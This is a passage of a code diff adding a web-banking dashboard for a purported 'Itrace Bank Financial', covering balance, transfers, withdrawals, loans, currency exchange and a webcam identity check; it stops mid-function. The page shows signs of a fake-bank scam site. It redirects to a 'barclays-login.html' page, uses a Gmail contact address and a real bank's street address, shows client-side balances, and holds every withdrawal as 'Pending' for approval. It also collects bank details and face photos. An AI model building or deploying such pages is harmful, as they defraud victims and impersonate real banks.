@@ -1,0 +1,1034 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>My Account — Itrace Bank Financial</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet"/>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{--navy:#00195A;--blue:#003087;--blue2:#00579F;--gold:#FFD700;--bg:#F4F7FD;--line:#E3EAF7;--text:#1a1a2e;--muted:#6B7280;--green:#10B981;--red:#DC2626}
+body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh}
+/* TOP BAR */
+.top{background:var(--navy);height:64px;display:flex;align-items:center;justify-content:space-between;padding:0 1.5rem;position:sticky;top:0;z-index:10}
+.brand{display:flex;align-items:center;gap:0.65rem;color:white}
+.brand-ic{width:36px;height:36px;border-radius:9px;background:linear-gradient(135deg,#00579F,#003087);display:flex;align-items:center;justify-content:center;font-weight:900}
+.brand b{font-size:0.95rem}.brand small{display:block;font-size:0.6rem;opacity:0.55}
+.top-right{display:flex;align-items:center;gap:1rem;color:white}
+.avatar{width:34px;height:34px;border-radius:50%;background:var(--gold);color:var(--navy);display:flex;align-items:center;justify-content:center;font-weight:800;font-size:0.85rem}
+.btn-out{background:transparent;border:1px solid rgba(255,255,255,0.3);color:white;padding:0.4rem 0.9rem;border-radius:8px;font-size:0.78rem;cursor:pointer;font-family:inherit}
+/* LAYOUT */
+.wrap{display:flex;min-height:calc(100vh - 64px)}
+.side{width:220px;background:white;border-right:1px solid var(--line);padding:1rem 0;flex-shrink:0}
+.nav{display:flex;align-items:center;gap:0.65rem;padding:0.7rem 1.25rem;font-size:0.84rem;color:var(--muted);cursor:pointer;border-left:3px solid transparent}
+.nav:hover{background:var(--bg);color:var(--navy)}
+.nav.on{color:var(--blue);font-weight:700;border-left-color:var(--blue);background:#EEF3FC}
+.main{flex:1;padding:1.75rem;max-width:1000px}
+.page{display:none}.page.on{display:block}
+h2{font-size:1.25rem;font-weight:800;color:var(--navy);margin-bottom:1rem}
+/* CARDS */
+.bal-card{background:linear-gradient(135deg,#00195A,#003087 60%,#00579F);color:white;border-radius:16px;padding:1.75rem;margin-bottom:1.25rem}
+.bal-card small{font-size:0.7rem;opacity:0.65;text-transform:uppercase;letter-spacing:0.08em}
+.bal-card .amt{font-size:2.4rem;font-weight:900;color:var(--gold);margin:0.35rem 0}
+.bal-card .meta{display:flex;gap:2rem;font-size:0.78rem;opacity:0.8;margin-top:0.75rem;flex-wrap:wrap}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:1.25rem}
+.card{background:white;border:1px solid var(--line);border-radius:14px;padding:1.25rem;margin-bottom:1.25rem}
+.card h3{font-size:0.92rem;font-weight:800;color:var(--navy);margin-bottom:0.85rem}
+.qa{display:grid;grid-template-columns:repeat(4,1fr);gap:0.75rem;margin-bottom:1.25rem}
+.qa div{background:white;border:1px solid var(--line);border-radius:12px;padding:1rem 0.5rem;text-align:center;font-size:0.76rem;font-weight:600;color:var(--navy);cursor:pointer}
+.qa div:hover{border-color:var(--blue);box-shadow:0 4px 12px rgba(0,48,135,0.08)}
+.qa span{display:block;font-size:1.3rem;margin-bottom:0.3rem}
+/* TRANSACTIONS */
+.tx{display:flex;justify-content:space-between;align-items:center;padding:0.75rem 0;border-bottom:1px solid var(--line)}
+.tx:last-child{border-bottom:none}
+.tx .t1{font-size:0.86rem;font-weight:600;color:var(--navy)}
+.tx .t2{font-size:0.7rem;color:var(--muted);margin-top:0.15rem}
+.tx .amt-in{color:var(--green);font-weight:800}
+.tx .amt-out{color:var(--red);font-weight:800}
+.badge{font-size:0.65rem;font-weight:700;padding:0.15rem 0.5rem;border-radius:10px;background:#FEF3C7;color:#92400E;margin-left:0.4rem}
+.empty{text-align:center;padding:2rem;color:var(--muted);font-size:0.85rem}
+/* DETAILS */
+.kv{display:grid;grid-template-columns:1fr 1fr;gap:0.75rem}
+.kv div{background:var(--bg);border-radius:10px;padding:0.75rem}
+.kv small{display:block;font-size:0.6rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.05em;margin-bottom:0.2rem}
+.kv b{font-size:0.86rem;color:var(--navy);word-break:break-all}
+/* FORMS */
+.fg{margin-bottom:0.95rem}
+.fg label{display:block;font-size:0.68rem;font-weight:700;color:var(--navy);text-transform:uppercase;letter-spacing:0.05em;margin-bottom:0.35rem}
+.fg input,.fg select{width:100%;padding:0.75rem 0.9rem;border:2px solid var(--line);border-radius:10px;font-size:0.88rem;font-family:inherit;outline:none;background:white}
+.fg input:focus,.fg select:focus{border-color:var(--blue)}
+.btn-main{width:100%;padding:0.9rem;background:linear-gradient(135deg,#003087,#00579F);color:white;border:none;border-radius:10px;font-size:0.92rem;font-weight:800;cursor:pointer;font-family:inherit}
+.btn-main:hover{opacity:0.92}
+.info{background:#EEF3FC;border:1px solid #C7D7F5;border-radius:10px;padding:0.8rem;font-size:0.8rem;color:var(--navy);margin-bottom:0.95rem;line-height:1.6}
+.err{background:#FEF2F2;border:1px solid #FECACA;border-radius:10px;padding:0.8rem;font-size:0.8rem;color:var(--red);margin-bottom:0.95rem}
+/* RECEIPT */
+.receipt{background:white;border:1px solid var(--line);border-radius:14px;overflow:hidden;margin-top:1.25rem}
+.rc-head{background:var(--navy);color:white;padding:1rem 1.25rem;display:flex;justify-content:space-between;align-items:center}
+.rc-head b{font-size:0.92rem}.rc-head small{font-size:0.65rem;opacity:0.6;display:block}
+.rc-ok{background:#ECFDF5;color:#065F46;text-align:center;font-weight:800;font-size:0.85rem;padding:0.7rem}
+.rc-amt{text-align:center;padding:1.1rem;border-bottom:1px dashed var(--line)}
+.rc-amt small{font-size:0.65rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.08em}
+.rc-amt div{font-size:1.9rem;font-weight:900;color:var(--navy);margin-top:0.25rem}
+.rc-row{display:flex;justify-content:space-between;padding:0.6rem 1.25rem;border-bottom:1px solid var(--line);font-size:0.8rem}
+.rc-row span{color:var(--muted)}.rc-row b{color:var(--navy);text-align:right;max-width:60%}
+.rc-foot{padding:0.85rem;text-align:center;font-size:0.65rem;color:var(--muted);background:var(--bg)}
+.rc-actions{display:flex;gap:0.6rem;padding:0.9rem 1.25rem}
+.rc-actions button{flex:1;padding:0.6rem;border-radius:8px;font-weight:700;font-size:0.8rem;cursor:pointer;font-family:inherit;border:1px solid var(--line);background:white;color:var(--navy)}
+/* CURRENCY EXCHANGE */
+.rates{display:grid;grid-template-columns:repeat(4,1fr);gap:0.6rem}
+.rate{background:var(--bg);border-radius:10px;padding:0.7rem;text-align:center}
+.rate b{display:block;font-size:0.9rem;color:var(--navy)}
+.rate small{font-size:0.7rem;color:var(--muted)}
+@media(max-width:768px){.rates{grid-template-columns:repeat(2,1fr)}}
+/* LOANS */
+.prod-grid{display:grid;grid-template-columns:1fr 1fr;gap:0.85rem;margin-bottom:1.25rem}
+.prod{background:white;border:2px solid var(--line);border-radius:14px;padding:1.1rem;cursor:pointer}
+.prod:hover{border-color:var(--blue)}
+.prod-ic{font-size:1.5rem;margin-bottom:0.35rem}
+.prod b{display:block;color:var(--navy);font-size:0.95rem}
+.prod-rate{font-size:0.85rem;font-weight:800;color:var(--blue);margin:0.25rem 0}
+.prod small{font-size:0.72rem;color:var(--muted)}
+.row2{display:grid;grid-template-columns:1fr 1fr;gap:0.85rem}
+.calc{display:grid;grid-template-columns:repeat(3,1fr);gap:0.6rem;margin-top:0.5rem}
+.calc div{background:var(--bg);border-radius:10px;padding:0.75rem;text-align:center}
+.calc small{display:block;font-size:0.62rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.04em}
+.calc b{font-size:1rem;color:var(--navy)}
+.ln-item{display:flex;justify-content:space-between;padding:0.7rem 0;border-bottom:1px solid var(--line);font-size:0.84rem}
+.ln-item:last-child{border-bottom:none}
+.ln-item small{display:block;color:var(--muted);font-size:0.7rem;margin-top:0.15rem}
+.pill{font-size:0.66rem;font-weight:700;padding:0.15rem 0.5rem;border-radius:10px;background:#FEF3C7;color:#92400E;height:fit-content}
+@media(max-width:768px){.prod-grid,.row2,.calc{grid-template-columns:1fr}}
+/* FACE VERIFICATION */
+.vf-bg{display:none;position:fixed;inset:0;background:rgba(0,25,90,0.72);align-items:center;justify-content:center;z-index:50;padding:1rem}
+.vf-box{background:white;border-radius:16px;padding:1.5rem;width:100%;max-width:420px;text-align:center}
+.vf-box h3{font-size:1.05rem;font-weight:800;color:var(--navy);margin-bottom:0.35rem}
+.vf-sub{font-size:0.8rem;color:var(--muted);margin-bottom:1rem;line-height:1.6}
+#vf-video,.vf-img{width:100%;border-radius:12px;background:#000;display:block;margin-bottom:0.75rem}
+#vf-video{transform:scaleX(-1)}
+.vf-msg{font-size:0.8rem;color:var(--navy);margin-bottom:0.75rem}
+.vf-row{display:flex;gap:0.6rem}
+.vf-row button{flex:1;padding:0.7rem;border-radius:8px;border:1px solid var(--line);background:white;color:var(--navy);font-weight:700;cursor:pointer;font-family:inherit}
+.vf-cancel{margin-top:0.8rem;background:none;border:none;color:var(--muted);cursor:pointer;font-family:inherit;font-size:0.82rem}
+/* TOAST */
+#toast{position:fixed;bottom:1.5rem;right:1.5rem;background:var(--navy);color:white;padding:0.85rem 1.1rem;border-radius:10px;font-size:0.82rem;display:none;max-width:320px;box-shadow:0 8px 24px rgba(0,0,0,0.2);z-index:99}
+@media(max-width:768px){.side{display:none}.main{padding:1rem}.qa{grid-template-columns:repeat(2,1fr)}.grid2{grid-template-columns:1fr}}
+</style>
+<link rel="stylesheet" href="itrace-theme.css"/>
+<link rel="manifest" href="manifest.json"/>
+<meta name="theme-color" content="#00195A"/>
+<meta name="apple-mobile-web-app-capable" content="yes"/>
+<meta name="apple-mobile-web-app-title" content="Itrace Bank"/>
+<link rel="apple-touch-icon" href="apple-touch-icon.png"/>
+<script>if('serviceWorker' in navigator){ navigator.serviceWorker.register('sw.js'); }</script>
+</head>
+<body>
+<div id="google_translate_element" style="position:fixed;bottom:12px;left:12px;z-index:9999"></div>
+<script>
+function googleTranslateElementInit(){
+  new google.translate.TranslateElement({pageLanguage:'en',includedLanguages:'',layout:google.translate.TranslateElement.InlineLayout.SIMPLE,autoDisplay:false},'google_translate_element');
+}
+</script>
+<script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+
+
+<div class="top">
+  <div class="brand"><div class="brand-ic"><img src="itrace-logo.svg" alt="Itrace Bank logo" style="width:100%;height:100%;display:block;border-radius:inherit"/></div><div><b>Itrace Bank Financial</b><small>Digital-First Banking</small></div></div>
+  <div class="top-right"><div class="avatar" id="av">?</div><button class="btn-out" onclick="logout()">Sign Out</button></div>
+</div>
+
+<div class="wrap">
+  <div class="side">
+    <div class="nav on" onclick="go('home',this)">🏠 Overview</div>
+    <div class="nav" onclick="go('transfer',this)">💸 Transfer Money</div>
+    <div class="nav" onclick="go('withdraw',this)">🏧 Withdraw</div>
+    <div class="nav" onclick="go('loans',this)">💰 Loans</div>
+    <div class="nav" onclick="go('fx',this)">💱 Currency Exchange</div>
+    <div class="nav" onclick="go('cards',this)">💳 My Card</div>
+    <div class="nav" onclick="go('profile',this)">👤 My Profile</div>
+    <div class="nav" onclick="go('transactions',this)">📋 Transactions</div>
+    <div class="nav" onclick="go('account',this)">🏦 Account Details</div>
+    <div class="nav" onclick="go('support',this)">🎧 Support</div>
+  </div>
+
+  <div id="frozenBanner" style="display:none;background:#FEF2F2;border:1px solid #FECACA;color:#B91C1C;border-radius:10px;padding:0.9rem 1rem;margin:0 1.5rem 1rem;font-size:0.88rem;font-weight:700">
+  Your account is frozen. Transactions are not available. Please contact the bank.
+</div>
+<div class="main">
+
+    <!-- OVERVIEW -->
+    <div class="page on" id="pg-home">
+      <h2 id="greet">Welcome</h2>
+      <div class="bal-card">
+        <small>Available Balance</small>
+        <div class="amt" id="bal">—</div>
+        <div class="meta">
+          <span>Account: <b id="acc">—</b></span>
+          <span>Type: <b id="type">—</b></span>
+          <span>Routing: <b id="route">—</b></span>
+        </div>
+      </div>
+      <div class="qa">
+        <div onclick="go('transactions')"><span>📋</span>Transactions</div>
+        <div onclick="go('account')"><span>🏦</span>Account Details</div>
+        <div onclick="go('support')"><span>🎧</span>Support</div>
+        <div onclick="logout()"><span>🚪</span>Sign Out</div>
+      </div>
+      <div class="card">
+        <h3>Recent Activity</h3>
+        <div id="recent"></div>
+      </div>
+    </div>
+
+    <!-- TRANSACTIONS -->
+    <div class="page" id="pg-transactions">
+      <h2>Transactions</h2>
+      <div class="card"><div id="allTx"></div></div>
+    </div>
+
+    <!-- ACCOUNT DETAILS -->
+    <div class="page" id="pg-account">
+      <h2>Account Details</h2>
+      <div class="card">
+        <div class="kv">
+          <div><small>Account Holder</small><b id="d-name">—</b></div>
+          <div><small>Account Number</small><b id="d-acc">—</b></div>
+          <div><small>Account Type</small><b id="d-type">—</b></div>
+          <div><small>Routing Number</small><b id="d-route">—</b></div>
+          <div><small>Email</small><b id="d-email">—</b></div>
+          <div><small>Member Since</small><b id="d-joined">—</b></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- TRANSFER -->
+    <div class="page" id="pg-transfer">
+      <h2>Transfer Money</h2>
+      <div class="card">
+        <div class="fg"><label>Recipient Name</label><input type="text" id="tr-name" placeholder="Full name"/></div>
+        <div class="fg"><label>Recipient Account Number</label><input type="text" id="tr-acc" placeholder="Account number"/></div>
+        <div class="fg"><label>Recipient Routing Number</label><input type="text" id="tr-route" placeholder="9-digit routing number"/></div>
+        <div class="fg"><label>Amount ($)</label><input type="number" id="tr-amt" min="1" step="0.01" placeholder="0.00"/></div>
+        <div class="fg"><label>Note (optional)</label><input type="text" id="tr-note" placeholder="e.g. Rent"/></div>
+        <button class="btn-main" onclick="guard('transfer')">Send Transfer</button>
+      </div>
+      <div id="tr-receipt"></div>
+    </div>
+
+    <!-- WITHDRAW -->
+    <div class="page" id="pg-withdraw">
+      <h2>Withdraw Funds</h2>
+      <div class="card">
+        <div class="fg"><label>Withdrawal Method</label>
+          <select id="wd-method" onchange="wdFields()">
+            <option value="bank">Bank Transfer (to my own bank)</option>
+            <option value="cash">Cash Pickup (at branch)</option>
+          </select>
+        </div>
+        <div id="wd-bank">
+          <div class="fg"><label>My Bank Name</label><input type="text" id="wd-bank-name" placeholder="e.g. Chase, Wells Fargo"/></div>
+          <div class="fg"><label>My Account Number</label><input type="text" id="wd-bank-acc" placeholder="Account number at my bank"/></div>
+          <div class="fg"><label>My Routing Number</label><input type="text" id="wd-bank-route" placeholder="9-digit routing number"/></div>
+        </div>
+        <div id="wd-cash" style="display:none">
+          <div class="info">Collect cash at Itrace Bank Financial, 27 Gresham Street, London, EC2V 7HN, United Kingdom. Bring a valid photo ID.</div>
+        </div>
+        <div class="fg"><label>Amount ($)</label><input type="number" id="wd-amt" min="10" step="0.01" placeholder="0.00"/></div>
+        <button class="btn-main" onclick="guard('withdraw')">Request Withdrawal</button>
+      </div>
+      <div id="wd-receipt"></div>
+    </div>
+
+    <!-- LOANS -->
+    <div class="page" id="pg-loans">
+      <h2>Loans</h2>
+      <div class="info">Rates shown are indicative. Your final rate depends on our review of your application. Funds are only released after approval.</div>
+
+      <div class="prod-grid">
+        <div class="prod" onclick="pickLoan('personal')">
+          <div class="prod-ic">👤</div><b>Personal Loan</b>
+          <div class="prod-rate">from 8.99% APR</div>
+          <small>$1,000 – $50,000 · 12–60 months</small>
+        </div>
+        <div class="prod" onclick="pickLoan('auto')">
+          <div class="prod-ic">🚗</div><b>Auto Loan</b>
+          <div class="prod-rate">from 6.49% APR</div>
+          <small>$5,000 – $80,000 · 24–72 months</small>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>Loan Calculator</h3>
+        <div class="row2">
+          <div class="fg"><label>Loan Type</label>
+            <select id="ln-prod" onchange="loanTerms();loanCalc()">
+              <option value="personal">Personal Loan (8.99% APR)</option>
+              <option value="auto">Auto Loan (6.49% APR)</option>
+            </select>
+          </div>
+          <div class="fg"><label>Amount ($)</label><input type="number" id="ln-amt" min="1000" step="100" placeholder="10000" oninput="loanCalc()"/></div>
+        </div>
+        <div class="fg"><label>Term</label><select id="ln-term" onchange="loanCalc()"></select></div>
+        <div class="calc">
+          <div><small>Monthly payment</small><b id="ln-monthly">$0.00</b></div>
+          <div><small>Total interest</small><b id="ln-interest">$0.00</b></div>
+          <div><small>Total repaid</small><b id="ln-total">$0.00</b></div>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>Apply for a Loan</h3>
+        <div id="ln-err"></div>
+        <div class="row2">
+          <div class="fg"><label>Annual Income ($)</label><input type="number" id="ln-income" min="0" step="100" placeholder="60000"/></div>
+          <div class="fg"><label>Employment</label>
+            <select id="ln-emp">
+              <option>Employed full-time</option><option>Self-employed</option><option>Part-time</option><option>Retired</option><option>Other</option>
+            </select>
+          </div>
+        </div>
+        <div class="fg"><label>Purpose of loan</label><input type="text" id="ln-purpose" placeholder="e.g. Car purchase, home repairs"/></div>
+        <button class="btn-main" onclick="loanApply()">Submit Application</button>
+        <div id="ln-result"></div>
+      </div>
+
+      <div class="card">
+        <h3>My Loan Applications</h3>
+        <div id="ln-list"></div>
+      </div>
+    </div>
+
+    <!-- CURRENCY EXCHANGE -->
+    <div class="page" id="pg-fx">
+      <h2>Currency Exchange</h2>
+      <div class="info">Buy a foreign currency with your USD balance. A 1% exchange margin is included in the rate. Rates shown are indicative and are locked when you confirm.</div>
+
+      <div class="card">
+        <h3>Today's Indicative Rates (1 USD =)</h3>
+        <div class="rates" id="fx-rates"></div>
+      </div>
+
+      <div class="card">
+        <h3>Exchange USD</h3>
+        <div class="row2">
+          <div class="fg"><label>You pay (USD)</label><input type="number" id="fx-amt" min="1" step="0.01" placeholder="100.00" oninput="fxPreview()"/></div>
+          <div class="fg"><label>You receive</label>
+            <select id="fx-to" onchange="fxPreview()"></select>
+          </div>
+        </div>
+        <div class="calc">
+          <div><small>Rate</small><b id="fx-rate">—</b></div>
+          <div><small>You receive</small><b id="fx-recv">—</b></div>
+          <div><small>Balance after</small><b id="fx-after">—</b></div>
+        </div>
+        <div style="height:0.9rem"></div>
+        <button class="btn-main" onclick="guard('fx')">Confirm Exchange</button>
+      </div>
+      <div id="fx-receipt"></div>
+    </div>
+
+    <!-- MY CARD -->
+    <div class="page" id="pg-cards">
+      <h2>My Card</h2>
+      <div id="cardBox"></div>
+      <div class="card">
+        <h3>Card details</h3>
+        <div class="row2">
+          <div class="fg"><label>Card holder</label><div id="cd-holder" style="font-weight:700;color:#00195A">—</div></div>
+          <div class="fg"><label>Expiry</label><div id="cd-expiry" style="font-weight:700;color:#00195A">—</div></div>
+          <div class="fg"><label>Daily limit</label><div id="cd-limit" style="font-weight:700;color:#00195A">—</div></div>
+          <div class="fg"><label>Online payments</label><div style="font-weight:700;color:#065F46">Enabled</div></div>
+        </div>
+        <div class="info">For your safety, the full card number and security code are not shown on screen. Contact the bank if you need them.</div>
+      </div>
+    </div>
+
+    <!-- MY PROFILE -->
+    <div class="page" id="pg-profile">
+      <h2>My Profile</h2>
+      <div class="card" style="display:flex;align-items:center;gap:1.25rem;flex-wrap:wrap">
+        <div id="profAvatar" style="width:96px;height:96px;border-radius:50%;background:linear-gradient(135deg,#FFE34D,#FFB300);display:flex;align-items:center;justify-content:center;font-size:1.6rem;font-weight:900;color:#00195A;background-size:cover;background-position:center;flex-shrink:0"></div>
+        <div style="flex:1;min-width:200px">
+          <div id="pr-name" style="font-size:1.1rem;font-weight:800;color:#00195A">—</div>
+          <div id="pr-acc" style="font-size:.85rem;color:#6B7280;margin-top:.2rem">—</div>
+          <label class="btn-main" style="display:inline-block;margin-top:.8rem;padding:.6rem 1rem;cursor:pointer;width:auto">📷 Upload photo
+            <input type="file" accept="image/*" onchange="uploadProfilePhoto(this)" style="display:none"/>
+          </label>
+          <div class="hint" style="margin-top:.4rem">Optional. JPG or PNG, shown on your dashboard.</div>
+        </div>
+      </div>
+      <div class="card" id="installCard" style="display:block">
+        <h3>📱 Install the Itrace app</h3>
+        <p style="font-size:0.86rem;color:#6B7280;margin-bottom:0.8rem;line-height:1.6">Add Itrace Bank to your home screen for quick access, like any other app.</p>
+        <button class="btn-main" style="width:auto;padding:.7rem 1.2rem" onclick="installApp()">Add to home screen</button>
+        <div class="hint" style="margin-top:.7rem">iPhone: tap the Share button, then "Add to Home Screen".</div>
+      </div>
+            <div class="card">
+        <h3>Account details</h3>
+        <div class="row2">
+          <div class="fg"><label>Account type</label><div id="pr-type" style="font-weight:700;color:#00195A">—</div></div>
+          <div class="fg"><label>Routing number</label><div id="pr-route" style="font-weight:700;color:#00195A">—</div></div>
+          <div class="fg"><label>Email</label><div id="pr-email" style="font-weight:700;color:#00195A">—</div></div>
+          <div class="fg"><label>Member since</label><div id="pr-joined" style="font-weight:700;color:#00195A">—</div></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SUPPORT -->
+    <div class="page" id="pg-support">
+      <h2>Support</h2>
+      <div class="card">
+        <h3>Contact Itrace Bank Financial</h3>
+        <p style="font-size:0.85rem;color:var(--muted);line-height:1.7">
+          Email: <b style="color:var(--navy)">bankitrace@gmail.com</b><br/>
+          Mailing: Itrace Bank Financial, 27 Gresham Street, London, EC2V 7HN, United Kingdom
+        </p>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<div id="vf" class="vf-bg">
+  <div class="vf-box">
+    <h3>Verify your identity</h3>
+    <p class="vf-sub">For your security, we need to confirm it is you before this payment is processed.</p>
+    <div id="vf-cam">
+      <video id="vf-video" autoplay playsinline muted></video>
+      <p id="vf-msg" class="vf-msg">Starting camera…</p>
+      <button id="vf-capture" class="btn-main" onclick="captureFace()" disabled>📸 Capture</button>
+    </div>
+    <div id="vf-ok" style="display:none">
+      <img id="vf-img" class="vf-img" alt="Captured photo"/>
+      <p class="vf-msg">Photo captured. Confirm to continue.</p>
+      <div class="vf-row">
+        <button onclick="retakeFace()">Retake</button>
+        <button class="btn-main" onclick="confirmFace()">Confirm &amp; Continue</button>
+      </div>
+    </div>
+    <canvas id="vf-canvas" style="display:none"></canvas>
+    <button class="vf-cancel" onclick="closeVerify()">Cancel</button>
+  </div>
+</div>
+
+<div id="toast"></div>
+
+<script>
+let C = null;
+
+function load(){
+  let raw = sessionStorage.getItem('barc_customer') || localStorage.getItem('barc_customer');
+  if(!raw){ window.location.href='barclays-login.html'; return; }
+  try{ C = JSON.parse(raw); }catch(e){ window.location.href='barclays-login.html'; return; }
+  if(!C || !C.accNum){ window.location.href='barclays-login.html'; return; }
+
+  const first = (C.name||'Customer').split(' ')[0];
+  const initials = (C.name||'?').split(' ').map(n=>n[0]).join('').toUpperCase();
+  set('av', initials);
+  set('greet', 'Welcome back, ' + first);
+  set('bal', C.balance);
+  set('acc', C.accNum);
+  set('type', C.type);
+  set('route', C.sortCode);
+  set('d-name', C.name);
+  set('d-acc', C.accNum);
+  set('d-type', C.type);
+  set('d-route', C.sortCode);
+  set('d-email', C.email);
+  set('d-joined', C.joined);
+
+  renderTx();
+}
+
+function set(id, val){
+  const el = document.getElementById(id);
+  if(el) el.textContent = val || '—';
+}
+
+function getTx(){
+  if(window._remoteTx) return window._remoteTx;
+  let list = [];
+  try{
+    list = JSON.parse(localStorage.getItem('barc_tx_'+C.accNum) || '[]');
+  }catch(e){}
+  return list;
+}
+
+function txRow(t){
+  const cls = t.direction === 'credit' ? 'amt-in' : 'amt-out';
+  const sign = t.direction === 'credit' ? '+' : '-';
+  const pending = t.status === 'Pending' ? '<span class="badge">Pending</span>' : '';
+  return '<div class="tx"><div><div class="t1">'+t.title+pending+'</div><div class="t2">'+t.date+'</div></div><div class="'+cls+'">'+sign+t.amount+'</div></div>';
+}
+
+function renderTx(){
+  const list = getTx();
+  const recent = document.getElementById('recent');
+  const all = document.getElementById('allTx');
+  const emptyHtml = '<div class="empty">No transactions yet</div>';
+  if(recent) recent.innerHTML = list.length ? list.slice(0,5).map(txRow).join('') : emptyHtml;
+  if(all) all.innerHTML = list.length ? list.map(txRow).join('') : emptyHtml;
+}
+
+function go(id, el){
+  document.querySelectorAll('.page').forEach(p=>p.classList.remove('on'));
+  document.querySelectorAll('.nav').forEach(n=>n.classList.remove('on'));
+  const pg = document.getElementById('pg-'+id);
+  if(pg) pg.classList.add('on');
+  if(el) el.classList.add('on');
+  if(id==='transactions') renderTx();
+  if(id==='loans'){ loanTerms(); loanCalc(); renderLoans(); }
+  if(id==='fx'){ fxSetup(); }
+  if(id==='cards'){ renderCard(); }
+  if(id==='profile'){ renderProfile(); }
+}
+
+/* ---------- MONEY HELPERS ---------- */
+function toNum(s){ return parseFloat(String(s||'0').replace(/[$,£\s]/g,'')) || 0; }
+function fmt(n){ return '$' + n.toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2}); }
+
+function saveBalance(newBal){
+  if(window.DB && C && C.accNum){
+    window.DB.setBalance(C.accNum, fmt(newBal)).catch(e => console.error('Balance save failed', e));
+  }
+  C.balance = fmt(newBal);
+  const s = JSON.stringify(C);
+  try{ sessionStorage.setItem('barc_customer', s); }catch(e){}
+  try{ localStorage.setItem('barc_customer', s); }catch(e){}
+  // Also store the balance so the login page picks it up on any visit on this device
+  let bals = {};
+  try{ bals = JSON.parse(localStorage.getItem('barc_balances')||'{}'); }catch(e){}
+  bals[C.accNum] = C.balance;
+  localStorage.setItem('barc_balances', JSON.stringify(bals));
+  set('bal', C.balance);
+}
+
+function addTx(tx){
+  if(window.DB && C && C.accNum){
+    window.DB.addTransaction(C.accNum, tx)
+      .then(() => refreshRemote())
+      .catch(e => console.error('Transaction save failed', e));
+  }
+  let list = getTx();
+  list.unshift(tx);
+  localStorage.setItem('barc_tx_'+C.accNum, JSON.stringify(list));
+  renderTx();
+}
+
+function stamp(){
+  const d = new Date();
+  return {
+    date: d.toLocaleDateString('en-US',{month:'short',day:'2-digit',year:'numeric'}) + ' · ' + d.toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit'}),
+    ref: 'BRC' + Math.floor(100000000 + Math.random()*900000000)
+  };
+}
+
+function submitRequest(kind, data){
+  if(!window.DB || !C || !C.accNum) return Promise.resolve();
+  return window.DB.addRequest(C.accNum, Object.assign({kind: kind, status: 'Pending'}, data))
+    .catch(e => console.error('Request save failed', e));
+}
+
+function receiptHtml(r){
+  const rows = r.rows.map(x=>'<div class="rc-row"><span>'+x[0]+'</span><b>'+x[1]+'</b></div>').join('');
+  return '<div class="receipt">'
+    + '<div class="rc-head"><div><b>Itrace Bank Financial</b><small>Payment Receipt</small></div><div style="font-size:0.7rem">'+r.ref+'</div></div>'
+    + '<div class="rc-ok">✓ '+r.title+'</div>'
+    + '<div class="rc-amt"><small>Amount</small><div>'+r.amount+'</div></div>'
+    + rows
+    + '<div class="rc-actions"><button onclick="window.print()">🖨 Print</button></div>'
+    + '<div class="rc-foot">Itrace Bank Financial · 27 Gresham Street, London, EC2V 7HN, United Kingdom</div>'
+    + '</div>';
+}
+
+/* ---------- TRANSFER ---------- */
+function doTransfer(){
+  const name = document.getElementById('tr-name').value.trim();
+  const acc  = document.getElementById('tr-acc').value.trim();
+  const route= document.getElementById('tr-route').value.trim();
+  const amt  = parseFloat(document.getElementById('tr-amt').value);
+  const note = document.getElementById('tr-note').value.trim();
+  const out  = document.getElementById('tr-receipt');
+  out.innerHTML = '';
+
+  if(!name || !acc || !route || !amt){ out.innerHTML='<div class="err">Please fill in all required fields.</div>'; return; }
+  if(amt <= 0){ out.innerHTML='<div class="err">Enter an amount greater than zero.</div>'; return; }
+  const bal = toNum(C.balance);
+  if(amt > bal){ out.innerHTML='<div class="err">Insufficient funds. Your balance is '+C.balance+'.</div>'; return; }
+
+  /* balance changes only when the bank approves the request */
+  const st = stamp();
+  addTx({title:'Transfer to '+name, date:st.date, amount:fmt(amt), direction:'debit', status:'Pending', ref:st.ref});
+  submitRequest('transfer', {amount:amt, recipientName:name, recipientAccount:acc, routing:route, note:note, ref:st.ref});
+
+  out.innerHTML = receiptHtml({
+    title:'Transfer Request Submitted', ref:st.ref, amount:fmt(amt),
+    rows:[
+      ['From', C.name + ' · ' + C.accNum],
+      ['To', name],
+      ['Recipient account', acc],
+      ['Routing number', route],
+      ['Note', note || '—'],
+      ['Date & time', st.date],
+      ['New balance', C.balance]
+    ]
+  });
+
+  document.getElementById('tr-name').value='';
+  document.getElementById('tr-acc').value='';
+  document.getElementById('tr-route').value='';
+  document.getElementById('tr-amt').value='';
+  document.getElementById('tr-note').value='';
+  toast('Transfer request submitted for approval');
+}
+
+/* ---------- WITHDRAW ---------- */
+function wdFields(){
+  const m = document.getElementById('wd-method').value;
+  document.getElementById('wd-bank').style.display = m==='bank' ? 'block' : 'none';
+  document.getElementById('wd-cash').style.display = m==='cash' ? 'block' : 'none';
+}
+
+function doWithdraw(){
+  const m   = document.getElementById('wd-method').value;
+  const amt = parseFloat(document.getElementById('wd-amt').value);
+  const out = document.getElementById('wd-receipt');
+  out.innerHTML = '';
+
+  if(!amt || amt < 10){ out.innerHTML='<div class="err">The minimum withdrawal is $10.</div>'; return; }
+  const bal = toNum(C.balance);
+  if(amt > bal){ out.innerHTML='<div class="err">Insufficient funds. Your balance is '+C.balance+'.</div>'; return; }
+
+  let rows = [], method = '';
+  if(m === 'bank'){
+    const bank  = document.getElementById('wd-bank-name').value.trim();
+    const bacc  = document.getElementById('wd-bank-acc').value.trim();
+    const broute= document.getElementById('wd-bank-route').value.trim();
+    if(!bank || !bacc || !broute){ out.innerHTML='<div class="err">Please fill in your bank details.</div>'; return; }
+    method = 'Bank Transfer';
